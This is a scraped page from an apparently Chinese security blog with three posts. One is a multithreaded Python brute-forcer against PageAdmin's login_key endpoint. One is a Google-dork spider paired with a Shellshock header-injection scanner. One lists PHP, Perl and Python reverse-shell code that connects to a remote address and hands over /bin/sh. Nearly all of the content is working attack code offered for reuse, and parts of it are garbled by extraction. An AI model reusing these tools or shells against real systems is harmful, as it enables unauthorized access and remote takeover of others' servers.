              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">in</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Python-C-C/" itemprop="url" rel="index">
                    <span itemprop="name">Python|C|C++</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>&nbsp; &nbsp; 这几天看PageAdmin这套程序，然后写了几个小工具，代码很简单，于是乎共享给大家，可能有朋友也会用到，恢复写博客，记录下我所干过的事，回到初衷。</p>
<p>1.login_key 生成validate（ps:程序中是calicate，不知道是不是程序员写错了），calidate是和程序权限验证相关的东西。</p>
<p>2.是关于发给提交给wooyun，关于login_key的爆破的漏洞的，爆破程序就不发了，记录下多线程爆破的一个模板。</p>
<pre class="brush:python; toolbar: true; auto-links: true;">#!/usr/bin/env python
#coding=utf-8
#PageAdmin login_key crack exploit          
#author: K1p4ss@insight-labs.org            
#blog: http://lanu.sinaapp.com
#date: 2014/11/21

import os
import re
import sys
import gzip
import time
import Queue
import getch
import urllib
import httplib
import StringIO
import datetime
import threading

print ’’’
#######################################################
#                                                     #
#          xxxxxxxxxxxxxxxxxxx crack exploit          #
#          author: K1p4ss@insight-labs.org            #
#          blog: http://lanu.sinaapp.com              #
#       date: 2014/11/21                           #
#                                                     #
#######################################################
’’’

class LoginKeyCrack(threading.Thread):
    def __init__(self):
          threading.Thread.__init__(self)
        self.conn = httplib.HTTPConnection(ztarget)  
    def run(self):
        while 1:
            if queue.empty()== True:
                self.conn.close()
                break            
            self.Crack()
    def Crack(self):
    global count,AvailableLoginKey
        self.loginkey = str(queue.get())
        count = count + 1
    #print "----&gt;"+str(count)+"|"+self.loginkey
    if((count%1000) == 0):
        print "
[--K1p4ss--]&gt;"+str(count)
    self.params = {’value’:self.loginkey} //post date
        self.params =  urllib.urlencode(self.params)
        try:
            self.conn.request(method="POST",url=target,body=self.params,headers=headers)
            self.response = self.conn.getresponse()
            if (’content-encoding’, ’gzip’) in self.response.getheaders():
                self.compressedstream = StringIO.StringIO(self.response.read())  
                self.gzipper = self.gzip.GzipFile(fileobj=self.compressedstream)     
                self.data = self.gzipper.read()
            else:
                self.data = self.response.read()
            if(self.data.find("1") &gt;= 0):
                print "
[-LoginKey-]&gt;"+self.loginkey
        AvailableLoginKey.append(self.loginkey)
        try:
            while 1:
            print "Y or N to continue,please press [y/n]"
                    chr = getch.getch()
            if chr == ’n’:
                for i in AvailableLoginKey:
                                print "
[-Available-]&gt; "+str(i)
                               os._exit(1)
            if chr == ’y’:
                break
            except:
                    os._exit(1)
        except Exception,e:
            print e
            pass            

def CreateLoginKey(LoginKeyStartTime,Days):
    DS = datetime.datetime(int(LoginKeyStartTime[0:4]),int(LoginKeyStartTime[4:6]),int(LoginKeyStartTime[6:8]))
    LKFile = open(’./login_key’,’a’)
    for i in range(Days&#4286400):
        DT = DS + datetime.timedelta(seconds = i)
        OutStr = DT.strftime("%Y%m%d%H%M%S")
           LKFile.write(OutStr+’
’)
    LKFile.close()

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print ’[-]usage:
[-]   python ’+sys.argv[0]+’ http://lanu.sinaapp.com 10 20141121 1
’
        exit(0)

    threads = []
    AvailableLoginKey = []
    target = sys.argv[1]
    ThreadNum = int(sys.argv[2])
    LoginKeyStartTime = sys.argv[3]
    Days = int(sys.argv[4])
    count = 0

    print ’
[----OK----]&gt;Creating loginkey...’
    if(os.path.exists(’./login_key’)):
    os.remove(’./login_key’)
    CreateLoginKey(LoginKeyStartTime,Days)

    loginkey = ’./login_key’
    fp = open(loginkey)

    queue = Queue.Queue()
    for Lkey in fp.readlines():
        queue.put(Lkey.split(’
’)[0])
    fp.close()      

    pattern = re.compile(’http:&#42’)
    match = pattern.search(target)
    if(match):
        print "
[----OK----]&gt;Starting..."
        ztarget = target.replace("http://","").split(’/’)[0]
        headers={"Host": ztarget,
                "User-Agent": "Mozilla/5.0",
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": "http://"+ztarget
                }     
    else:
        print "
[--ERROR--]-&gt;Please Enter : http://www.xxx.com/"
        os._exit(1)

    try:
        for i in range(ThreadNum):
        #print i
            a = LoginKeyCrack()
            a.start()
            threads.append(a)
    for j in threads:
            j.join()
            print j
    except Exception,e:
    print e</pre>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2014/09/26/摘录GoogleSpider代码段/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2014/09/26/摘录GoogleSpider代码段/" itemprop="url">摘录GoogleSpider代码段</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2014-09-26T10:16:05+08:00">
                2014-09-26
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">in</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Python-C-C/" itemprop="url" rel="index">
                    <span itemprop="name">Python|C|C++</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>看见一段不错的google spider 的python代码段，记录下来用的时候直接复制粘贴：author:Netxfly</p>
<pre class="brush:python; toolbar: true; auto-links: true;"># -&#42- coding : utf8 -&#42-
import json
import time
import datetime
import requests

class GoogleSpider(object):
    def __init__(self, p):
        self.p = p
        self.url = ’https://ajax.googleapis.com/ajax/services/search/web’
        self.keyword = r’filetype:sh inurl:cgi-bin’
        self.session = requests.Session()
        url = ’%s?v=1.0&amp;q=%s&amp;rsz=8&amp;start=0’ % (self.url, self.keyword)
        r = self.session.get(url, verify=True)
        self.result = json.loads(r.text)

    def get_result(self):
        self.pages = self.result.get(’responseData’).get(’cursor’).get(’pages’)
        results = []
        if self.pages:
            for page in self.pages:
                url = ’%s?v=1.0&amp;q=%s&amp;rsz=8&amp;start=%s’ % (self.url, self.keyword, page.get(’start’))
                r = self.session.get(url, verify=True)
                result = json.loads(r.text)
                results.extend(result.get(’responseData’).get(’results’))
                time.sleep(3)
                if page.get(’start’) &gt; self.p:
                    break

        self.results = dict(
            time = datetime.datetime.now(),
            p = self.p,
            data = results
            )

        return self.results

class Scan(object):
    def __init__(self, url):
        self.url = url
        self.session = requests.Session()

    def Send(self):
        payload = {
        r’() { 1;}; echo -e "headerx3ashellshock-scan1"’ : ’() { 1;}; echo -e "headerx3ashellshock-scan2"’
        }
        r = self.session.get(self.url, headers = payload)
        if r.headers[’header’] == ’shellshock-scan2’:
            print "%s has vulnerable" % url
        else:
            print "%s no vulnerable" % url

if __name__ == ’__main__’:
    spider = GoogleSpider(10)        # google page size : 200
    results = spider.get_result()
    for item in results.get(’data’):
        url = item.get(’url’)
        try:
            print "[&#42] Checking : %s" % url
            #scan = Scan(url)
            #scan.Send()
        except Exception, e:
            pass
        else:
            pass

    # try:
    #     url = ’http://manticore.2y.net/cgi-bin/dlwct.sh’
    #     print "[&#42] Checking : %s" % url
    #     scan = Scan(url)
    #     scan.Send()
    # except Exception, e:
    #     pass
    # else:
    #     pass</pre>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2014/09/26/记录一些反弹shell代码/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2014/09/26/记录一些反弹shell代码/" itemprop="url">记录一些反弹shell代码</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2014-09-26T09:48:06+08:00">
                2014-09-26
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">in</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/技术文章/" itemprop="url" rel="index">
                    <span itemprop="name">技术文章</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>php:</p>
<pre class="brush:php; toolbar: true; auto-links: true;">$protocol=getprotobyname(’tcp’);
$Sock=socket_create(AF_INET,SOCK_STREAM,$protocol);
$ret=socket_connect($Sock,gethostbyname(’127.0.0.1’),’11011’);
$message="------PhpShell hacked by mickey---------
mickey@pentest:";
socket_write($Sock,$message,strlen($message));
while($cmd=socket_read($Sock,65535,$protocol)){
    if(trim(strtolower($cmd))=="exit"){
    socket_write($Sock,"Bye Bye,hacked by mickey
");
    exit;
    }else{
        $process = proc_open($cmd, array(0=&gt;array("pipe","r"),1=&gt;array("pipe","w"),2=&gt;array("pipe","w"),),$pipes,str_replace(’\’,’/’,dirname(__FILE__)),array(’PATH’=&gt;’/bin:/usr/bin:/usr/local/bin:/usr/local/sbin:/usr/sbin’));
        if(is_resource($process)){
            fwrite($pipes[0], $cmd);
            fclose($pipes[0]);
            $msg=stream_get_contents($pipes[1]);
            socket_write($Sock,$msg,strlen($msg));
            fclose($pipes[1]);
            $msg=stream_get_contents($pipes[2]);
            socket_write($Sock,$msg,strlen($msg));
            $return_value = proc_close($process);
    }
        socket_write($Sock,’mickey@pentest:’,strlen(’mickey@pentest:’));
    }
}</pre>

<p>&nbsp;</p>
<p>perl:</p>
<pre class="brush:perl; toolbar: true; auto-links: true;">use strict;   
use Socket;    
use IO::Handle;   
my $pack_addr = sockaddr_in(8080, inet_aton("127.0.0.1"));
socket(S,AF_INET,SOCK_STREAM,0);
STDOUT-&gt;autoflush(1);
S-&gt;autoflush(1);
connect(S,$pack_addr);
open STDIN, "&lt;&amp;S";
open STDOUT, "&gt;&amp;S";
open STDERR, "&gt;&amp;S";
system("/bin/sh -i");    
close S;
exit 0;</pre>

<p>&nbsp;</p>
<p>python:</p>
<pre class="brush:python; toolbar: true; auto-links: true;">import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.0.0.1",1234));
os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);</pre>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/17/">17</a><a class="extend next" rel="next" href="/page/5/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">John Doe</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">165</span>
                  <span class="site-state-item-name">Artikel</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                
                  <span class="site-state-item-count">13</span>
                  <span class="site-state-item-name">Kategorien</span>
                
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                
                  <span class="site-state-item-count">182</span>
                  <span class="site-state-item-name">Tags</span>
                
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; 2011 &mdash; <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">John Doe</span>

  
</div>









        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
